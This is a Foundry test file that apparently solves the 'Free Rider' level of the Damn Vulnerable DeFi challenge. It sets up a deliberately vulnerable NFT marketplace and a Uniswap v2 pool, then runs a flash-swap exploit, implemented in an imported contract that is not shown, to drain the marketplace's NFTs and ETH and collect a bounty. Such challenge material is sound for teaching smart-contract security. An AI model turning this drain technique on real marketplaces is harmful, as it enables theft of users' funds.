// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {FreeRiderNFTMarketplace} from "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecovery} from "../../../src/Contracts/free-rider/FreeRiderRecovery.sol";
import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
import {FlashSwap} from "./FlashSwap.sol";
import {WETH} from "../../../lib/solmate/src/tokens/WETH.sol";
import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";

contract FreeRider is Test {
    // The NFT marketplace will have 6 tokens, at 15 ETH each
    uint256 constant NFT_PRICE = 15 ether;
    uint8 constant AMOUNT_OF_NFTS = 6;
    uint256 constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    uint256 constant BOUNTY = 45 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e17;

    // Initial reserves for the Uniswap v2 pool
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 15_000e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 9000 ether;
    uint256 constant DEADLINE = 10_000_000;

    FreeRiderRecovery recovery;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableToken dvt;
    DamnValuableNFT nft;
    IUniswapV2Pair uniswapV2Pair;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    FlashSwap flashSwap;
    WETH weth;
    address payable devs;
    address payable attacker;
    address payable deployer;

    function setUp() public {
        devs = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("devs")))))
        );
        vm.label(devs, "Devs");
        vm.deal(devs, BOUNTY);

        deployer = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("deployer")))))
        );
        vm.label(deployer, "Deployer");
        vm.deal(
            deployer,
            UNISWAP_INITIAL_WETH_RESERVE + MARKETPLACE_INITIAL_ETH_BALANCE
        );

        // Attacker starts with little ETH balance
        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);

        // Deploy WETH contract
        weth = new WETH();
        vm.label(address(weth), "WETH");

        // Deploy token to be traded against WETH in Uniswap v2
        vm.startPrank(deployer);
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deploy Uniswap Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Factory.json",
                abi.encode(address(0))
            )
        );

        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Router02.json",
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
        // Note that the function takes care of deploying the pair automatically
        dvt.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(dvt), // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            DEADLINE // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapV2Pair = IUniswapV2Pair(
            uniswapV2Factory.getPair(address(dvt), address(weth))
        );

        assertEq(uniswapV2Pair.token0(), address(dvt));
        assertEq(uniswapV2Pair.token1(), address(weth));
        assertGt(uniswapV2Pair.balanceOf(deployer), 0);

        marketplace = new FreeRiderNFTMarketplace{
            value: MARKETPLACE_INITIAL_ETH_BALANCE
        }(AMOUNT_OF_NFTS);

        nft = DamnValuableNFT(marketplace.token());

        for (uint8 id = 0; id < AMOUNT_OF_NFTS; id++) {
            assertEq(nft.ownerOf(id), deployer);
        }

        nft.setApprovalForAll(address(marketplace), true);

        uint256[] memory NFTForSell = new uint256[](6);
        uint256[] memory NFTPrices = new uint256[](6);
        for (uint8 i = 0; i < AMOUNT_OF_NFTS; ) {
            NFTForSell[i] = i;
            NFTPrices[i] = NFT_PRICE;
            unchecked {
                ++i;
            }
        }

        marketplace.offerMany(NFTForSell, NFTPrices);

        assertEq(marketplace.offersCount(), AMOUNT_OF_NFTS);
        vm.stopPrank();

        vm.startPrank(devs);

        recovery = new FreeRiderRecovery{value: BOUNTY}(attacker, address(nft));

        vm.stopPrank();
    }

    function testExploit() public {
        vm.startPrank(attacker, attacker);
        flashSwap = new FlashSwap{value: 0.01 ether}(
            payable(address(marketplace)),
            address(recovery),
            payable(address(uniswapV2Pair)),
            payable(address(weth))
        );
        vm.label(address(flashSwap), "FlashSwap contract");

        // Define data so that UniswapV2Pair.swap() could perform flashswap
        // Data must be attacker's address so that we can get the bounty
        bytes memory data = abi.encode(attacker);

        // Perform a flashswap
        uniswapV2Pair.swap(0, 15 ether, address(flashSwap), data);
        vm.stopPrank();
        validation();
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */

        // Attacker must have earned all ETH from the payout
        assertGt(attacker.balance, BOUNTY);
        assertEq(address(recovery).balance, 0);

        // The devs extracts all NFTs from its associated contract
        vm.startPrank(devs);
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            nft.transferFrom(address(recovery), devs, tokenId);
            assertEq(nft.ownerOf(tokenId), devs);
        }
        vm.stopPrank();

        // Exchange must have lost NFTs and ETH
        assertEq(marketplace.offersCount(), 0);
        assertLt(address(marketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);
    }
}
